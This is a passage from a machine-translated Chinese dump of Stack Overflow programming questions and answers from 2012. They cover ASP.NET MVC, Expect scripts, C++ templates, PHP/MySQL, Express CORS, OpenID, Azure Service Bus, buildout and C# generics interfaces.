            Voltage.setText(String.valueOf("电压为：" + sens));  

```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T01:40:11.023

您可以这样做的一种方法是将您从传感器获得的值存储到 ArrayList 中。你可以使用这样的东西

```
//add this declaration to your file
ArrayList<double> sensorValues;

//now anytime you take a new reading from your sensor add it to the array list.
sensorValues.add(newReadingFromSensor);

//when you want to make your chart do it like this.
values.add(sensorValues.toArray()); 
`````

# c# - 使用 EditorTemplate 将字节显示为复选框？

> ID：10078150
> 
> 赞同：0
> 
> 时间：2012-04-09T18:51:27.920
> 
> 标签：c#, asp.net-mvc-3, mvc-editor-templates, editortemplates

我的模型课：

```
public class StatusList
{
   public int StatusID {get;set;}
   [UIHint("ByteCheckbox")]
   public byte Active {get;set;}
} 
```

在 /Views/Shared/EditorTemplates 我创建了一个名为 ByteCheckbox.cshtml 的文件

editortemplate ByteCheckbox 包含（我的第三次尝试）：

```
@model byte
@if (Model == 1)
{
    @Html.CheckBox("", true)
}
else
{
    @Html.CheckBox("", false) 
} 
```

这样做很好地呈现了一个复选框。当我更改复选框状态并尝试保存更改时，模型验证会抱怨该值为“假”（或“真”）而不是预期的 0 或 1。

如何修改编辑器模板以允许翻译值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:14:43.340

~~你试过这个吗？~~

 ~~```
<div class="editor-label">
    @Html.LabelFor(model => model.Active)
</div>
<div class="editor-field">
    @Html.CheckBoxFor(model => model.Active != 0)
    @Html.ValidationMessageFor(model => model.Active)
</div> 
```~~  ~~您可以在模型中执行此操作：

```
public class StatusList
{
   public int StatusID {get;set;}
   public byte Active {get;set;}
   [NotMapped]
   public bool ActiveBool
   {
       get { return Active > 0; }
       set { Active = value ? 1 : 0; }
   }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:37:32.830

不要使用 Html.CheckBox；而是使用 Html.EditorFor。您需要在 Views/Shared/EditorTemplates 中定义一个名为 ByteCheckbox.cshtml 的文件才能正常工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T21:42:08.923

您还可以使用自定义模型绑定器。

这是小数的示例，但您可以针对`byte`类型执行此操作。

```
public class DecimalModelBinder : DefaultModelBinder {

    public override object BindModel(ControllerContext controllerContext, ModelBindingContext bindingContext) {
        dynamic valueProviderResult = bindingContext.ValueProvider.GetValue(bindingContext.ModelName);
        if (valueProviderResult == null) {
            return base.BindModel(controllerContext, bindingContext);
        }

        return ((string)valueProviderResult.AttemptedValue).TryCDec();
    }

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-07-05T08:03:25.043

试试这个

```
 @model bool

   <div class="editor-for">
       @Html.CheckBox("", Model, new{@class="tickbox-single-line"})
   <div> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-11-01T10:37:03.663

试试这个：

```
@Html.CheckBox("Model", "Model") 
```~~

# linux - 期望脚本写入文件部分输出

> ID：10078153
> 
> 赞同：0
> 
> 时间：2012-04-09T18:51:45.963
> 
> 标签：linux, expect

我正在尝试将期望脚本 ssh-ing 到服务器的部分输出写入日志文件。
现在我有这个脚本：

```
#!/usr/bin/expect -f
spawn telnet 192.168.20.222
match_max 10000
expect "*?to continue*"
send -- "\r"
send -- "show interfaces 1 \r"
expect -- "*?2626#*"
send -- "show interfaces 2 \r"
expect -- "*?2626#*"
send -- "exit \r"
expect -- "*?2626>*"
send -- "exit \r"
expect "*?y/n*"
send -- "y \r" 
```

我怎样才能将其更改为仅输出到文件“log.txt”`show interfaces 1`和 来自的响应`show interfaces 2` ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:20:39.593

```
...
log_file "log.txt" ;#enable loging to file as well
send -- "show interfaces 1 \r"
expect -- "*?2626#*"
send -- "show interfaces 2 \r"
expect -- "*?2626#*"
log_file; #disable logging
... 
```

'log.txt' 将包含两个命令 + 命令本身 + 提示的输出。这足够了吗？

获得纯输出可能更复杂，有用的技术是使用显式括号（不确定您正在与之交互的系统是否允许类似的东西）。在 shell 中，它看起来像：

```
send -- "show interfaces 1\r echo '<XYZ>'\r"
expect "<XYZ>"; #first echoed when the command was typed
expect {
   "<XYZ>" {
        #for the second time echoed when the command finished
        #here the $expect_out(0,string) contains the command output + the bracket
        regexp {(.*)<XYZ>} $expect_out(0,string) match pure_cmd_output
   }
} 
```

# c++ - 带有模板函数的 Typedef

> ID：10078159
> 
> 赞同：3
> 
> 时间：2012-04-09T18:52:07.480
> 
> 标签：c++, c++11

假设我在命名空间 A 中有一个模板函数。我还有另一个命名空间 B。在命名空间 A 中声明了一个模板函数，定义为

```
template<typename T, typename U>
void f(T a, U b); 
```

现在在命名空间 B 中，我想声明一个专门的模板函数类型。我在想我是否可以`typedef`使用模板函数，所以它在命名空间 B 中声明为

```
void f(int a, double b); 
```

没有实际实现调用模板函数的函数。由于有一种方法可以用特定的模板参数声明新的类型名，难道不应该有一种方法可以用函数来做到这一点吗？我尝试了不同的方法来实现它，但效果并不理想。

那么在 C++ 中是否已经有一种方法可以使用给定的模板参数重新声明函数而不实际实现新函数？如果不是，它是否可以在 C++11 中以某种方式实现？

这将是一个很好的功能，因为它会使函数的目的更清晰，并且在语法上会更好:)

编辑：所以可以写：

```
using A::f<int, double>; 
```

在 B 命名空间中，函数将显示这些模板参数

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-09T18:56:18.967

您可以使用`using`：

```
namespace A {
    template <typename T> void f(T);
    template <> void f<int>(int);    // specialization
}

namespace B {
    using ::A::f;
} 
```

您无法区分这样的*专业化*（因为`using`只是关于*names*），但它应该足以使所需的专业化可见。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T19:01:25.113

您可以包装内联函数：

```
namespace A
{
    template<typename T, typename U>
    void f(T a, U b);
};

namespace B
{
    inline void f(int a, double b) { A::f(a,b); }
}; 
```

看到这个问题：

[C++11：如何给函数起别名？](https://stackoverflow.com/questions/9864125/c11-how-to-alias-a-function)

# mysql - mysql_affected_rows 给出“提供的参数不是有效的 MySQL-Link 资源”错误 WITH VALID QUERY

> ID：10078164
> 
> 赞同：0
> 
> 时间：2012-04-09T18:52:18.507
> 
> 标签：mysql

这个问题已经发了50次了，答案总是“你的查询有错误”。好吧，**我的查询是有效的**，并且我的数据库已使用值进行了更新，但我仍然遇到 mysql_affected 行的问题。我的简化代码：

```
$sql = "UPDATE t_users
    SET t_users.facebookID = '$facebookID'
    WHERE t_users.username = '$username'";

$query = mysql_query($sql);

if ($query){
  if (mysql_affected_rows($query)) echo "success";
}
else echo "error registering account--error was " . mysql_error(); 
```

当我运行它时，facebookID 列会更新，但我收到警告：

```
<b>Warning</b>:  mysql_affected_rows(): supplied argument is not a valid MySQL-Link resource... 
```

任何想法还有什么要检查的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:12:21.903

```
int mysql_affected_rows ([ resource $link_identifier = NULL ] ) 
```

to 的参数[`mysql_affected_rows`](http://us.php.net/manual/en/function.mysql-affected-rows.php)应该是返回的资源`mysql_connect`，而不是返回的资源`mysql_query`。或者它可以完全省略。

# objective-c - 缩小和旋转三角形

> ID：10078166
> 
> 赞同：0
> 
> 时间：2012-04-09T18:52:20.260
> 
> 标签：objective-c, ios, animation

我将如何为三角形制作动画，其中动画包括缩小三角形，同时围绕其中心旋转它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:13:56.067

像这样

```
#define degreesToRadians(x) (M_PI * x / 180.0)

  [UIView animateWithDuration:1.0 animations:^ {
    triangle.transform = CGAffineTransformMakeRotation(degreesToRadians(480));
    triangle.frame = CGRectMake(triangle.frame.origin.x + triangle.frame.size.width / 2, triangle.frame.origin.y + triangle.frame.size.height / 2, 0.0, 0.0);
  }]; 
```

# apache - htaccess mod_headers 用于无缓存

> ID：10078168
> 
> 赞同：1
> 
> 时间：2012-04-09T18:52:28.167
> 
> 标签：apache, jsp, caching, http-headers, mod-headers

我们有一个应用程序允许用户添加/编辑/替换/删除内容（文本、图像、swfs、mp3s 等）。我们希望管理员通过使用无缓存标头始终拥有最新更新的文件，并且当用户运行应用程序时，所有内容都会获取/使用缓存。

我研究了解决方案并尝试使用 html 元标记，例如：

```
<meta http-equiv="expires" content="0" />
<meta http-equiv="cache-control" content="no-cache, no-store" />
<meta http-equiv="pragma" content="no-cache" /> 
```

但这似乎不是一个好的解决方案，因为这发生在创建标头之后并且不会更改媒体（图像、swfs、mp3 等）标头。

我想使用 apache 设置标题并遇到[此站点](http://www.askapache.com/htaccess/using-http-headers-with-htaccess.html)的此代码：

```
<filesMatch "\.(html|htm|js|css)$">
FileETag None
<ifModule mod_headers.c>
Header unset ETag
Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"
Header set Pragma "no-cache"
Header set Expires "Wed, 11 Jan 1984 05:00:00 GMT"
</ifModule>
</filesMatch> 
```

这似乎是一个很好的解决方案，但是我们需要缓存和不应该缓存之间的唯一真正区别是 URL（preview.jsp 与 run.jsp），因此我们无法通过文件类型匹配它因为大多数文件都是一样的。

有人对这种情况有很好的解决方案吗？

谢谢。

编辑：

Preview.jsp和run.jsp基本相同，只是jsp和js处理不同。他们通过 iframe 读取相同的内容和媒体。例如，它们看起来像：

```
<%
//Some JSP
%>
/* HTML Headers, JS, ETC */
<iframe id="contentFrame" seamless="1" src="http://somedomain.com/template.html"></iframe>
/* End HTML */ 
```

preview.jsp 和 run.jsp 出现在同一目录中并使用所有相同的资源。我正在寻找一种解决方案，让 preview.jsp 不缓存任何东西，而 run.jsp 来缓存东西。

服务器是用 Apache Tomcat 设置的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:57:01.910

您可以在 Java servlet 中设置相应的标头。Apache mod_headers 主要用于由 Apache 管理的静态资源。而应用服务器提供的一切都在 AS 端进行管理。

通常，您可以为此目的使用过滤器。这是一个例子：[http ://www.tidytutorials.com/2009/11/adding-headers-to-requests-in-filters.html](http://www.tidytutorials.com/2009/11/adding-headers-to-requests-in-filters.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T21:08:50.833

[`SetEnvIf`](http://httpd.apache.org/docs/2.2/mod/mod_setenvif.html#setenvif)和的组合[`Header`](http://httpd.apache.org/docs/2.2/mod/mod_headers.html#header)可能会奏效：

```
# Image, CSS and JavaScript requests normally contain the Referer header
# which tells apache which page is requesting the resource
# Use SetEnvIf directive to set a flag for internal uses

SetEnvIf Referer preview\.jsp force_no_cache

# Header directive optionally accepts env= argument
# If present, the directive is fired if the flag is set

Header unset ETag env=force_no_cache

# repeat for other headers 
```

# php - 使用 fopen 和 append 创建 PHP 数组

> ID：10078169
> 
> 赞同：1
> 
> 时间：2012-04-09T18:52:38.243
> 
> 标签：php, arrays, fopen, fputs

我无法弄清楚如何使用 fopen "a" 附加模式写入文件。

文件本身是一个简单的 PHP 数组：

```
$array = array(
  "entry1"   => "blah blah",
  "entry2"   => "forbarbaz",
); 
```

很简单。因此，使用 fopen 并将第二个参数设置为“a”应该允许我使用 fputs 附加文件....问题是开始行和结束行，即`$array = array(`和`);`

所以现在文件应该是这样的：

```
 "entry1"   => "blah blah",
  "entry2"   => "forbarbaz", 
```

假设它只是一个 txt 文件，其中包含条目列表而没有开始和结束行，我将如何将这些数据重建为一个工作 PHP 数组？抱歉，如果不清楚，它有点复杂。不，我不会将这些值存储在数据库中，我需要通过将这些特定值保存在文件数组中来获得速度优势。

所以问题真的是我将如何从 txt 文件中构造可用的 PHP 数组，并像这样逐行列出？

澄清：

我如何使用这样的行拉入一个 txt 文件：

```
 "entry1"   => "blah blah",
  "entry2"   => "forbarbaz", 
```

并有一个可行的 $php_array()????

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T18:58:28.067

试试这个。

文件格式（在开始使用它时）：

```
<?php
$array = array(); 
```

现在它是正确的 php 文件。

然后只需添加新行，如下所示：

```
$f = fopen('myarray.php', 'a');
fputs($f, PHP_EOL.'$array["entry1"] = "value1";');
fclose($f); 
```

并通过简单地使用它`include('myarray.php');`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T18:55:24.797

为什么不`json_encode`将数组存储在文件中，然后`json_decode`将 JSON 从文件中提取到数组中？

[json_encode](http://us2.php.net/manual/en/function.json-encode.php)
[json_decode](http://us2.php.net/manual/en/function.json-decode.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T18:57:57.530

未经测试。试试这个：

```
$data = file_get_contents('./data.txt', true);
$array = eval("array(".$data.")"); 
```

仅供参考，shiplu.mokadd.im 的解决方案是最简单的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T19:02:49.067

也许您正在寻找 fseek 功能：[http ://se.php.net/fseek](http://se.php.net/fseek)

在`r+`模式下打开文件时，文件指针位于文件的开头。听起来您想将它放在文件末尾减去几个字节，然后写入新数据。

# sql-server - SQL Server - 用于应用程序访问的角色是什么？

> ID：10078171
> 
> 赞同：1
> 
> 时间：2012-04-09T18:52:52.817
> 
> 标签：sql-server, sql-server-2008-r2

SQL 登录必须执行以下哪些服务器角色和/或数据库角色：

1.  读取数据（包括临时表）
2.  写入数据（包括临时表）
3.  在他们被授予访问权限的数据库中执行任何 SP

我们正在从 SQL 2000 迁移到 2008，我正在检查所有登录，并注意到它们都设置为 sysadmin 和 db_owner，这并不好。我们使用这些登录名的应用程序只会执行我上面列出的操作，这就是我想知道的原因。我知道我可以使用 db_datareader 和 db_datawriter 的数据库角色设置每个登录名，但这不包括执行 SP。我们在 2 或我们的数据库中有接近 300 个 SP，并且必须通过每个 SP 并在扩展属性中设置登录权限会太长太乏味。

任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T18:55:07.030

> 必须通过每个 SP 并在扩展属性中设置登录权限会太长太乏味

然而，这也是最安全的。

使用内置角色会将过多的数据库暴露给应用程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:07:14.260

您可以授予`db_datareader`和/或`db_datawriter`执行权吗？这将赋予用户在其有权访问的数据库中执行任何存储过程的权限。如果您有视图，您还需要授予他们选择权限。

```
GRANT EXECUTE TO db_datawriter 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:18:18.730

我要么只是处理它并手动设置权限，要么（我的偏好）创建具有您想要授予的权限类型的数据库角色，并为这些角色分配登录名。这样，如果多个登录需要相同的权限集，您只需赋予他们相同的角色。

作为奖励，如果您的可编程性对象具有某种前缀命名约定，以便（例如）从您的登录信息表中读取的过程都以 pAccount_ 之类的东西开头，那么您可以`GRANT`根据前缀动态地对角色执行的例行公事。

# javascript - 脊椎、node.js (express) 和 Access-Control-Allow-Origin

> ID：10078173
> 
> 赞同：11
> 
> 时间：2012-04-09T18:53:05.237
> 
> 标签：javascript, jquery, ajax, node.js, spine.js

我正在本地电脑上开发一个应用程序。前端应该使用 spinjs 构建，后端 API 应该使用 node.js。Spine 在端口 9294 上运行，node.js 在端口 3000 上运行。在 Spine 中，我在模型中添加了以下内容：

```
@url: "http:localhost:3000/posts" 
```

在我的快递服务器中

```
app.get('/posts', function(req, res){
  console.log("giving ALL the posts");
  res.header("Access-Control-Allow-Origin", "*")
  res.json(posts);
}); 
```

但我总是在 chrome 中遇到以下错误：

```
XMLHttpRequest cannot load http://localhost:3000/posts. Origin http://localhost:9294 is not allowed by Access-Control-Allow-Origin. 
```

我必须做什么才能正确访问我的 api？我虽然在响应中添加标题确实解决了这个问题。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-04-10T02:25:41.163

`app.get`只会响应`GET`请求。如果浏览器使用`OPTIONS`请求对其进行预检，express 将发送错误，因为它没有任何侦听器来处理这些请求。尝试在您的代码之外添加此代码，看看它是否有效：

```
app.options('/posts', function(req, res){
  console.log("writing headers only");
  res.header("Access-Control-Allow-Origin", "*");
  res.end('');
}); 
```

另请注意：如果您使用请求 ( `withcredentials=true`) 发送 cookie，则`Access-Control-Allow-Origin`标头不能是`*`，它必须是`Origin`浏览器自动添加到 ajax 请求的标头中的确切值，如下所示：

```
res.header("Access-Control-Allow-Origin", req.headers.origin); 
```

这是出于安全原因 - 如果您正在做一些需要 cookie 的事情，那么您更有可能需要实际检查该`origin`网站是否是允许的网站，以避免[CSRF 攻击](https://en.wikipedia.org/wiki/Cross-site_request_forgery)。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-11-29T14:48:48.730

该中间件将允许 CORS 使用 Express，关键是检测预检请求`OPTIONS`并返回响应以避免 404 或重复的数据库查询。见资源：[http ://cuppster.com/2012/04/10/cors-middleware-for-node-js-and-express/](http://cuppster.com/2012/04/10/cors-middleware-for-node-js-and-express/)

```
var methodOverride = require('method-override');
app.use(methodOverride());

// ## CORS middleware
// see: http://stackoverflow.com/questions/7067966/how-to-allow-cors-in-express-nodejs
var allowCrossDomain = function(req, res, next) {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    // intercept OPTIONS method
    if ('OPTIONS' == req.method) {
      res.send(200);
    }
    else {
      next();
    }
};
app.use(allowCrossDomain); 
```

# .net - 关于 OpenId 的一些问题

> ID：10078174
> 
> 赞同：0
> 
> 时间：2012-04-09T18:53:10.447
> 
> 标签：.net, security, openid, dotnetopenauth

我正在研究 OpenId 并查看它是否对我的网站来说是一个很好的解决方案，有些事情让我感到困惑。如果我错了，请纠正我。

“我的理解是，OpenID 的工作方式是用户将凭据发送到授权服务器，而受信任的服务器会判断该用户是否合法。”

现在，让我们以 Stackoverflow 为例。我看到了雅虎和谷歌的所有这些图标以及一切，我猜 Stackoverflow 说这些是我信任的提供商，如果他们信任你，我就信任你。

现在，还有一个显示 OpenID 的按钮，我也可以继续在那里注册。现在那是一个独立的授权服务器吗？谁是它的提供者？

如果我想将 openID 嵌入到我的网络项目中。我应该使用哪个授权服务器？每当我搜索 OpenId 时，我都会将此 OAuth 视为一个选项；它是授权服务器吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T01:22:13.500

OpenID 是一种标准，而不是身份验证提供者。

*   OpenID URI 提供了足够的信息去到 auth 提供者进行身份验证。
*   用户在提供商的网站上输入他们的登录凭据。此步骤依赖于用户知道他们的提供者的授权页面是什么样的。
*   回复，加上引荐来源标头，旨在提供足够的信息来安全地验证用户身份。

OAuth 是 OpenID 的补充。

[谷歌有一个相当好的流程解释： [https](https://developers.google.com/accounts/docs/OpenID) ://developers.google.com/accounts/docs/OpenID ]

许多网站为特定的身份验证提供者提供选项只是为了简化流程。OpenID URI 不统一，因此您无法分辨（例如）来自电子邮件地址的 URI 是什么。

一些身份验证提供商（如 Google）很难找出您的 OpenID 实际是什么，大概是为了使登录对用户更加透明（并随后将品牌添加到依赖方的网站）。

如果您知道您的 OpenID URI 是什么，您应该能够在任何兼容的站点上输入它，而无需执行“选择已知提供商”步骤。但是，该选项是否可用由作者自行决定。

[关于身份验证提供者的“可信度”，存在一些潜在问题： [http](http://en.wikipedia.org/wiki/OpenID#Security) ://en.wikipedia.org/wiki/OpenID#Security ]

[ OpenID 基金会有官方答案： http: [//openid.net/get-an-openid/](http://openid.net/get-an-openid/) ]

# spring - roo 创建的重复 *.aj 文件

> ID：10078177
> 
> 赞同：3
> 
> 时间：2012-04-09T18:53:17.707
> 
> 标签：spring, spring-roo

我有一个 roo 项目，我一直在努力，没有真正的问题。我遇到了一些奇怪的错误，所以我重新启动了 STS，然后清理了项目并重新启动了 roo shell。

现在，在包资源管理器中，我拥有由 roo 创建的所有 *.aj 文件的副本。它们确实是同一个文件，因为当我双击每个文件时，会打开同一个文件（如果它已经在选项卡中打开，那么它将它带到前面而不是打开另一个选项卡）。我不想删除 roo。如何摆脱 roo 创建的重复项？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-25T12:08:00.657

我正在从您的评论中复制您的答案，因此您可以接受这一点并将此问题标记为已回答，因为它在未回答时显示为未回答的问题。

> 好的，所以我不知道是什么原因造成的，但这是我能够解决的方法。右键单击项目>关闭项目。再次右键单击项目>打开项目。刷新，所有重复的都消失了。

顺便说一句，你确定你不能回答你自己的问题吗？我能够这样做，而且我的代表少于 100 个。对于我的代表，我无法评论您的评论，因此我需要将此评论添加到我的答案中。

# c++ - tbb 中的并行任务

> ID：10078178
> 
> 赞同：0
> 
> 时间：2012-04-09T18:53:20.663
> 
> 标签：c++, parallel-processing, task, tbb

我有以下要作为并行任务运行的功能：

```
void WuManberFinder::find() 
```

所以我写了以下内容：

```
void WuManberFinder::Parallel_find()
{

 tbb::task_group g;

 for(auto i = 0; i != tbb::tbb_thread::hardware_concurrency(); ++i) 
 {
  g.run(find);
 }

   g.wait();

 } 
```

但它给了我以下错误：

```
wumanber.cc:139:17: error: no matching function for call to ‘tbb::task_group::run(<unresolved overloaded function type>)’
wumanber.cc:139:17: note: candidates are:
/usr/include/tbb/task_group.h:209:10: note: void tbb::task_group::run(const F&) [with F = void (thru::matching::WuManberFinder::*)()]
/usr/include/tbb/task_group.h:209:10: note:   no known conversion for argument 1 from ‘&lt;unresolved overloaded function type>’ to ‘void (thru::matching::WuManberFinder::* const&)()’
/usr/include/tbb/task_group.h:151:10: note: template<class F> void tbb::internal::task_group_base::run(tbb::task_handle<F>&) 
```

这是序列号（尚未完成）：

```
 void WuManberFinder::find() {    
    while(m_pos <= m_text2.size()) {        
        string bgram = m_text2.substr(m_pos - m_B, m_B);
        shift_type::iterator i = m_shift.find(bgram);           
    if (i == m_shift.end())
        {// shared variable lock
        m_pos += m_lmin - m_B + 1;
        }// unlock
    else {

        if (i->second == 0) {

            vector<size_t>& list = m_hash[bgram];
            // Verify all patterns in list against the text.

            //shared variable lock
            ++m_pos;
            //unlock         

            for (size_t j = 0; j < list.size(); ++j) {
                string const& str = m_patterns[list[j]];
                m_find_pos = m_pos - str.size() - 1;
                size_t k = 0;

                for (; k < str.size(); ++k)
                    if (str[k] != m_text2[m_find_pos + k])
                        break;

                if (k == str.size()) {
                    m_find_pattern_index = list[j];
                 //  cout << "***" << m_patterns[m_find_pattern_index] <<endl;
                   // return true
                   // shared variable lock
                   m_intrusions++;
                   // unlock
                }
            }
        }
        else
           { // access m_pos shared critical section
            m_pos += i->second;
           } // access m_pos shared critical section
    }
    }

   // return false;  nothing found
     } 
```

我知道这可能看起来很奇怪，但主要思想是我希望这种类型的多个任务遍历一个字符串。共享变量是`pos`。你能给我一个提示吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T18:59:52.540

我不认为您正在做的事情是一个好主意，尽管如果不知道 find 应该做什么，我无法更好地解释。要使该代码正常工作，您需要执行以下操作：

```
g.run(std::bind(&WuManberFinder::find, this)); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:27:31.000

如果您想使用 TBB 来并行化搜索，我建议您将方法基于使用 TBB 实现的并行查找的示例代码（[TBB 教程](http://threadingbuildingblocks.org/uploads/81/91/Latest%20Open%20Source%20Documentation/Tutorial.pdf)的第 3.3.1 节）`parallel_reduce`。由于在您发布的代码中提到了锁和关键部分，您确实未能利用使其值得使用的高级 TBB 功能。

# java - 如何将 Groovy 添加到 Heroku 上的现有 Java 项目中

> ID：10078179
> 
> 赞同：0
> 
> 时间：2012-04-09T18:53:36.890
> 
> 标签：java, grails, maven, groovy, heroku

我有一个现有的 Heroku Java 项目。大多数逻辑和后端已经用 Java 编写，包括我的休眠 bean，但 Java 代码仅提供可编程的 Rest API。我现在想写一个功能性的网站，我认为使用 groovy 会更容易。

如何将 groovy 添加到 maven 以便编译？groovy 网站上的 gmaven 说明似乎已过时且损坏。

一旦成功，它会在 Heroku 上编译和运行吗？

这是个坏主意吗？我还需要 grails 来处理 gsp 之类的东西吗？

这在其他方面是不明智的吗？例如。我应该将其视为一个新项目，并将旧项目包含为一个 jar 吗？

谢谢！

# azure - Azure 服务总线中的竞争消费者消息模式

> ID：10078181
> 
> 赞同：3
> 
> 时间：2012-04-09T18:53:45.523
> 
> 标签：azure, azureservicebus

我刚刚开始使用 Windows Azure 服务总线（*主题和队列*），我正在尝试实现竞争消费者消息传递模式。

本质上，我想要一组消息**Producers**和一组消息**Consumers**。生成消息后，我希望第一个可用的消费者处理消息。其他消费者不应收到该消息。

有没有办法在 Azure 中做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-11T19:38:43.607

简单的。只需让两个（或更多）接收器同时从一个队列接收，你就完成了。任何检索到的消息都会恰好到达这些接收者之一，因为消息日志上的光标在接收消息时会前进。竞争消费者是网络队列的固有能力，因此实际上没有什么特别需要的。

如果您需要相反的情况 - 每条消息都发送给每个消费者 - 您可以为每个消费者创建一个订阅选项，这为您提供了一个独立于消息日志的游标，该游标可以独立于其他接收者移动。对于踢球，您显然也可以在订阅中拥有竞争消费者。

克莱门斯

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T20:39:43.697

你可能不想要 Topics ，而是[Brokered Messaging](http://msdn.microsoft.com/en-us/library/windowsazure/hh367512.aspx)。

您可以通过使用消息的标签和/或内容类型属性以及[PeekLock](http://msdn.microsoft.com/en-us/library/windowsazure/microsoft.servicebus.messaging.receivemode.aspx)接收模式来模拟代理消息传递中的类似主题的功能。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-20T20:57:22.163

主题是代理消息传递的一个功能，但它是一种一对多的“发布/订阅”模式。队列是一对一的消息通信。所以是的，听起来你应该简单地使用队列。另请参阅[http://msdn.microsoft.com/en-us/library/hh689723(VS.103).aspx](http://msdn.microsoft.com/en-us/library/hh689723(VS.103).aspx)。

# python - 在构建环境中安装包

> ID：10078186
> 
> 赞同：0
> 
> 时间：2012-04-09T18:54:21.067
> 
> 标签：python, django, buildout, django-lfs

我正在使用我使用 buildout 安装它的 django-lfs。现在我需要在我的开发环境中安装一些其他包。

我的问题是：在这种环境中安装其他软件包（不是系统范围）的最佳方法是什么。
假设我只想在我的开发环境中安装 django-debug-toolbar，而不是在生产环境中。

我是 virtualenv 和 pip 的用户

我的项目结构

```
myproject/
  README.txt  
  bootstrap.py  
  develop-eggs/  
  eggs/         
  misc/   
  scripts/
  bin/        
  buildout.cfg  
  dlcache/       
  lfs_project/  
  parts/  
  setup.cfg 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T06:27:37.767

您将包添加到您的 buildout.cfg。大概在该文件中有一个`eggs =`条目，无论是在全局级别（在`[buildout]`部分中）还是在单个配方级别。

添加额外的行很容易，它最终应该看起来像这样：

```
eggs = 
    django-lfs
    django-debug-toolbar 
```

鸡蛋名称是空格分隔的，缩进的新行算作不是（标准[`ConfigParser`](http://docs.python.org/library/configparser.html)格式）的初始行的一部分。

要区分生产配置和开发配置，只需创建单独的构建配置；我总是使用 a`development.cfg`和 a `production.cfg`（以及`staging.cfg`，单个集群机器 .cfgs 等）。扩展配置可以包含和覆盖其他配置，因此您`development.cfg`可以简单地包含`production.cfg`和添加鸡蛋和/或更改设置。

有关更多信息，请参阅[构建网站](http://www.buildout.org/)。如果您想要一个复杂的示例，请查看[Jarn Plone bootstrap buildout](https://github.com/Jarn/buildout)；它使用单独`production.cfg`的和`development.cfg`设置。

# c# - 如何在 C# 的接口中返回 Type T？

> ID：10078188
> 
> 赞同：6
> 
> 时间：2012-04-09T18:54:34.357
> 
> 标签：c#, generics, c#-4.0, interface

我有一个这样的界面：

```
public interface IUser{
    //some properties here

    T ToDerived(User u);
} 
```

我是界面开发的新手，所以这就是我想要完成的事情。我将有一个基类

```
public class User 
```

不实现上述接口。然后我会有一个派生类

```
SalesUser : User, IUser
{
    //no properties needed because they exist in the User class

    SalesUser ToDerived(User u)
    {
        //code for converting a base User to a derived SalesUser
    }
} 
```

我想在 SalesUser 类中为 ToDerived(User u) 编写函数，但是在接口中，我不知道如何将其定义为我现在在接口中的 ToDerived 方法声明没有编译。

我希望这是有道理的。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-09T18:56:24.830

```
public interface IUser<T> where T : User
{
    //some properties here

    T ToDerived(User u);
}

SalesUser : User, IUser<SalesUser>
{
    //no properties needed because they exist in the User class

    SalesUser ToDerived(User u)
    {
        //code for converting a base User to a derived SalesUser
    }
} 
```

不确定这是您想要的，但我在接口上添加了泛型类型约束以确保泛型类型是`User`或继承自它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:59:52.833

Oded的回答解决了编译问题，让你定义满足接口的ToDerived方法。但是，正如我在评论中所说，我不确定这是最好的实现。

我遇到的主要问题是在静态上下文中通常需要这样的转换方法。您没有 SalesUser 的实例；你想要一个，并且有一个用户，所以你在静态上下文中调用该方法（`SalesUser.ToDerived(myUser)`) 并且您得到一个 SalesUser （该方法更适合命名为 FromUser() 或类似名称）。您在界面中指定的方法要求您已经拥有一个 SalesUser 才能将 User 转换为 SalesUser。我能想到的唯一需要预先存在的 SalesUser 的情况是“部分克隆”；您正在使用来自传入的用户和调用该方法的 SalesUser 的信息创建一个新的 SalesUser 实例。在所有其他情况下，您要么不需要 SalesUser（转换，如前所述，它应该是静态的），要么不需要 User（产生新实例的“克隆”或“深拷贝”方法）与您调用该方法的实例相同的数据）。

此外，您的类的消费者必须知道他们必须调用 ToDerived() 才能执行从 User 到 SalesUser 的转换。通常，C# 程序员会期望显式或隐式转换可用：

```
public class SalesUser
{

    public static explicit operator (User user)
    {
        //perform conversion of User to SalesUser
    }

}

//the above operator permits the following:
mySalesUser = (SalesUser)myUser; 
```

... 或者，如果转换运算符失败，则希望能够使用 User 构造 SalesUser：

```
public class SalesUser:IUser
{
